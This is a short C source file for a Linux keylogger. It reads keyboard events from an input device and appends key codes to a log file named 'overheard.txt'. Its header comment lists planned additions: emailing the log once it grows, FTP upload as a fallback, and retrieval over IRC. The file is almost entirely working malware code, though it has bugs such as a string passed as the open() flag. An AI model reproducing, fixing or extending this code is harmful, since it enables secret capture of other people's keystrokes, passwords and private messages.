/*
* ADD TIMESTAMP
* ADD ERROR IF USER IS NOT ROOT
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices)
* ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
* IF STATEMENT--->SEND LOG FILE VIA EMAIL
* ELSE ERROR--->UPLOAD VIA FTP
* GRAB FROM IRC????
*/
#include <linux/input.h>	// input_event
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>  		// read
#include <string.h>

int main(int argc, char **argv) {
	FILE *listening;
	int key;
	char buff[2];  /* sets buffer size -- size of ev.code */

	if(argc < 2) {
		printf("USAGE: %s <device>\n", argv[0]);
		return 1;
	}

	listening = fopen("overheard.txt", "a+");  /* opens/creates the log */
	if (listening == NULL) {
		fprintf(stderr, "ERROR: Log file not found\n");
		return 1;
	}

	key = open(argv[1], "r");	/* opens the port */
	struct input_event ev;		/* using input_event so we 
								 * know what we're reading 
								 */

	while(1) {
		read(key, &ev, sizeof(struct input_event));
		if(ev.value == 0 && ev.type == 1) {			/* only register release state */
			fprintf(listening, "%i", ev.code);
			setvbuf(listening, buff, _IOFBF, 2);	/* forces the write
													 * to listening 
													 */
		}
	}
	fclose(listening);

	return 0;
}